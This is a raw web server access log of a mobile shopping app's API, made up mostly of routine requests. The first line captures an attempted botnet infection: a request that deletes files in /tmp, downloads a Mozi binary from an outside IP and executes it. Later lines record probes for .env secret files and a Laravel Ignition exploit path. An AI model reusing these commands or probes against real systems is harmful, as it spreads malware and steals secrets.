::1 - - [29/Jun/2022:00:05:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.95.92.74:33693/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 144 "-" "Hello, world"
::ffff:127.0.0.1 - - [29/Jun/2022:09:33:49 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:34:39 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:34:46 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:35:36 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:35:45 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:36:11 +0000] "GET /_ignition/execute-solution HTTP/1.0" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:09:36:20 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:36:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:36:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:36:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:36:21 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:36:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:36:32 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:36:38 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:36:43 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:36:45 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:36:58 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:37:04 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:37:11 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:37:13 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:37:14 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:37:16 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:37:17 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:37:24 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:37:27 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:37:29 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:39:03 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:40:08 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:05 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:07 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:36 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:41:37 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:41:47 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:45:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:45:27 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:45:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:45:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:45:34 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:45:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:48:41 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:48:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:48:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:48:42 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:48:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:48:42 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:48:48 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:09:52:17 +0000] "GET /api/v1/transactions/user?bill=62bc1836f4282e7602a282b8 HTTP/1.0" 200 892 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:10:01:57 +0000] "GET /api/v1/transactions/user?bill=62bc1836f4282e7602a282b8 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:10:16:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:10:16:26 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:10:16:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:10:16:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:10:16:27 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:10:16:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:06:13 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:11:06:14 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Jun/2022:11:13:54 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:13:54 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:13:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:13:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:13:56 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 200 3208 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:13:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:18:52 +0000] "GET /api/v1/bills/user HTTP/1.0" 200 1219 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:19:43 +0000] "GET /api/v1/users/logout HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:02 +0000] "POST /api/v1/users HTTP/1.0" 500 251 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:20:07 +0000] "POST /api/v1/users HTTP/1.0" 200 528 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:17 +0000] "POST /api/v1/users/login HTTP/1.0" 200 528 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:20:18 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:18 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:20:18 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:22 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:20:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:20:50 +0000] "POST /api/v1/goods HTTP/1.0" 200 345 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:51 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:20:52 +0000] "PUT /api/v1/goods/62bc359280269b9067b3fb06/upload-photo HTTP/1.0" 200 60 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 508 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:20:52 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 393 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:55 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:20:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:20:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:23 +0000] "POST /api/v1/goods HTTP/1.0" 200 341 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:23 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:23 +0000] "PUT /api/v1/goods/62bc35b380269b9067b3fb1b/upload-photo HTTP/1.0" 200 60 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 906 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 680 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:28 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 264 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:28 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:28 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:37 +0000] "GET /api/v1/bills/user HTTP/1.0" 200 358 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 910 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:38 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:56 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:21:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:21:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:22:01 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:22:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 678 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:22:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 678 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:22:04 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 266 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:22:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:22:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:22:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:22:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 908 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:22:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:22:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:22:19 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:22:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:22:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:24:12 +0000] "GET /api/v1/bills/user HTTP/1.0" 200 601 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:24:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:24:13 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:11:24:39 +0000] "GET /api/v1/bills/user HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:11:44:59 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
